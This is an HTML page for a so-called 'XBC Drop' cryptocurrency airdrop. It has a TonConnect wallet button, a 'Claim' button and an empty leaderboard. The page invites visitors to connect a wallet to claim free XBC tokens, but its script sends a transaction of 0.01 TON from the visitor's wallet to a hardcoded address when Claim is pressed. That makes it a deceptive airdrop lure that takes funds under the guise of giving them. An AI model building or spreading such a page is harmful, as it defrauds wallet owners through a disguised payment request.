<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
background-color: #252525;
color: #fff;
}
nav {
margin: 20px auto; /* Добавляем отступы сверху и снизу, а также центрируем по горизонтали */
padding: 8px;
border: 2px solid rgb(54, 54, 54);
border-radius: 8px;
background-color: #414040;
color: #ffffff;
max-width: 80%; /* Устанавливаем максимальную ширину */
margin-top: 0px; /* Отступ сверху */
    }
section {
  padding-top: 12%; /* Соответствует высоте nav */
  margin-top: 0; 
  display: flex; /* Используем flexbox для выравнивания */
  align-items: center; /* Вертикальное выравнивание */
  justify-content: center; /* Горизонтальное выравнивание */
}
h1 {
  font-family: "Arial";
  font-size: 45px;
  margin-left: 20px;
}
.leftimg {
  width: 150px; 
  height: 150px;
}
h3 {
font-family: Arial;
font-size: 30px;
position: fixed;
}
h2 {
  font-family: Arial; 
  font-size: 30px;
}
p {
  font-family: Arial; 
  font-size: 20px;
}
#content {
  width: 500px; /* Ширина слоя */
  margin: 0 auto 50px; /* Выравнивание по центру */
}
#footer {
  position: fixed; /* Фиксированное положение */
  right: 0; top: 0; /* Левый нижний угол */
  padding: 10px; /* Поля вокруг текста */
  background: #444444; /* Цвет фона */
  color: #fff; /* Цвет текста */
  width: 100%; /* Ширина слоя */
  height: 10%;
}
button.LeaderButton {
    background-color: #4d4c4c;
    border: 3px solid rgb(83, 83, 83);
    color: #ffffff;
    border-radius: 10px;
    padding: 10px;
    border: 3px solid #4d4c4c
    }
    .leaderboard-container {
  width: 395px;
  margin: 50px auto;
  background-color: rgb(65, 64, 64);
  border-radius: 10px;
  box-shadow: 0 2px 5px rgba(133, 132, 132, 0.1);
  border: 3px solid #4d4c4c
}

table {
  width: 100%;
  border-collapse: collapse;
}

th, td {
  padding: 12px 15px;
  text-align: left;
  font-family: Arial;
}

th {
  background-color: #3f3f3f;
  font-weight: bold;
  font-family: Arial;
}

tr:nth-child(even) {
  background-color: #575757;
  font-family: Arial;
}

tr:hover {
  background-color: #3f3f3f;
  font-family: Arial;
}
.floathingbutton {
  display: block;
  margin: 10px auto;
  border: none;
  border-radius: 5px;
  padding: 10px 20px;
  background-color: #707070;
  color: white;
  font-size: 16px;
  cursor: pointer;
  font-family: Arial;
}
</style>
</head>


<div id="footer"></div>
<h3>XbcFest</h3>

<body>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<div id="ton-connect" style="position: fixed; top: 3%; right: 5%"></div>
<script>
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://raw.githubusercontent.com/Stttnsik1/tonconnect-manifest.json/main/tonconnect-manifest.json',
        buttonRootId: 'ton-connect'
    });

    async function transaction() {
  const transaction = {
    validUntil: Math.round(Date.now() / 1000) + 10,
    messages: [
      {
        address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR",
        amount: "10000000"
      }
    ]
  };

  try {
    await tonConnectUI.sendTransaction(transaction);
  } catch (e) {
    console.error(e);
  }
}
</script>


<section>
  <img src="https://i.postimg.cc/3RwRgGXX/msg1029594875-176900-1.png" class="leftimg">
  <div> 
    <strong><h1>Welcome to the
    <br>
    XBC Drop!</h1></strong>
    </div>
    </section> 

    <strong><p>Participate in the drop with us!
    <br>
    Connect your wallet and claim your XBC to get
    <br>
     a seed and qualify for drops.</p></strong>
 
<button onclick="transaction()" class="floathingbutton"><strong>Claim</strong></button>    

<h2><strong><center>Leaderbord:</center></strong></h2>

<div class="leaderboard-container">
    <table>
      <tr>
        <th>Рейтинг</th>
        <th>Количество XBC</th>
        <th>Адрес</th>
      </tr>
      <tr>
        <td>1</td>
        <td></td>
        <td></td>
      </tr>
      <tr>
        <td>2</td>
        <td></td>
        <td></td>
      </tr>
      <tr>
        <td>3</td>
        <td></td>
        <td></td>
      </tr>
    </table>
  </div>
 
  </body>
  </html>
